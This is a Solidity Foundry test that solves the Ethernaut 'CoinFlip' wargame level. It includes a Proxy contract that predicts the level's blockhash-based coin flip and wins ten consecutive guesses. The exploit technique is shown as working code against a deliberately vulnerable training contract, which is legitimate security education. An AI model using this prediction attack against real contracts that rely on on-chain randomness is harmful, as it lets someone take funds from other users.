// SPDX-License-Identifier: UNLICENSED
pragma solidity >= 0.8.10;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol'; // Path change of openzeppelin contract
import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "./CoinFlip.sol";
import "./CoinFlipFactory.sol";
import "../Ethernaut.sol";

contract Proxy {
    using SafeMath for uint256;
    function HackCoinFlip(address instance) public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(uint256(57896044618658097711785492504343953926634992332820282019728792003956564819968));
        bool side = coinFlip == 1 ? true : false;
        (bool success, bytes memory data) = instance.call(abi.encodeWithSignature("flip(bool)", side));
        require(success);
    }
}

contract CoinFlipTest is DSTest {
    using SafeMath for uint256;

    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address myAddress = address(10);
    
    function setUp() public{
        vm.deal(myAddress, 5 ether);
        ethernaut = new Ethernaut();
    }

    function testCoinFlip() public {
        // SETUP
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory(); // cosa que sabe como crear niveles
        ethernaut.registerLevel(coinFlipFactory);
        
        vm.startPrank(myAddress);
        
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory); // Retorna la direccion del Delegation
        Proxy proxy = new Proxy();
        for (uint256 index = 0; index < 10; index++) {
            proxy.HackCoinFlip(levelAddress);
            
            vm.roll(block.number + 1);
        }

        // Asserts
        if(CoinFlip(levelAddress).consecutiveWins() == 10){
            bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
            vm.stopPrank();
            assert(levelSuccessfullyPassed);
        }
    }
}

